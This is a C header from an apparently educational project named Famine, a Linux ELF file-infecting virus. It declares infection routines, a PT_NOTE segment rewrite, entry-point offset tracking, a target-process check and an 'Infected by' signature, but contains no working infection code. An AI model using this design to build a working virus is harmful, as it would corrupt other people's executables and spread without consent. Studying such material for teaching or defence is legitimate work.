/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <nguiard@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/09/09 03:01:42 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/25 15:42:47 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef FAMINE_H
#define FAMINE_H

#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdbool.h>
#include <elf.h>
#include <stddef.h>

typedef	char *				str;
typedef	unsigned char		byte;
typedef	unsigned __int128	uint128_t;

#define SIGNATURE			"Infected by adben-mc and nguiard ;)"
#define SIGNATURE_LEN		40
#define SIGNATURE_OFFSET	128

#define	PF_FAMINE			0b10000

typedef struct dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char			d_name[256];
}	dirent;

typedef struct profiling {
	byte	*start_rip;
	size_t	size;
	byte	*signature;
	bool	original;
}	profiling;

typedef struct elf_data {
	Elf64_Ehdr	*elf;
	Elf64_Shdr	*sections;
	Elf64_Phdr	*segments;
	byte		*file;
	int64_t		fd;
	size_t		signature_offset_file;
	size_t		signature_offset_mem;
	size_t		infection_offset_file;
	size_t		infection_offset_mem;
	size_t		original_entry_point_file;
	size_t		original_entry_point_mem;
	size_t		original_size;
	size_t		new_size;
}	elf_data;

#define DT_UNKNOWN  0   // Unknown file type
#define DT_FIFO     1   // Named pipe (FIFO)
#define DT_CHR      2   // Character device
#define DT_DIR      4   // Directory
#define DT_BLK      6   // Block device
#define DT_REG      8   // Regular file
#define DT_LNK     10   // Symbolic link
#define DT_SOCK    12   // Socket
#define DT_WHT     14   // Whiteout (used in some special file systems)

#define PT_NULL		0
#define PT_LOAD		1
#define PT_DYNAMIC	2
#define PT_INTERP	3
#define PT_NOTE		4
#define PT_SHLIB	5
#define PT_PHDR		6
#define PT_TLS		7

#define MREMAP_MAYMOVE	1

#define BUFF_SIZE 0x1000
#define TARGET_PROCESS "sleep"

#include "asm_macros.h"

//	Utils
size_t		ft_strlen(str buff);
bool		ft_memcmp(const byte *a, const byte *b, size_t size);
void		ft_memcpy(byte *dest, const byte *src, size_t size);

//	Infection
bool		infect(profiling *this, const str path);
bool		is_process_running(void);

//	Profiling
profiling	get_profiling(byte *start_rip);

//	Note segment
bool		change_note_segment(profiling *this, elf_data *data);

// Debug purpose

# define perror(x)
# define fflush(x)

#endif
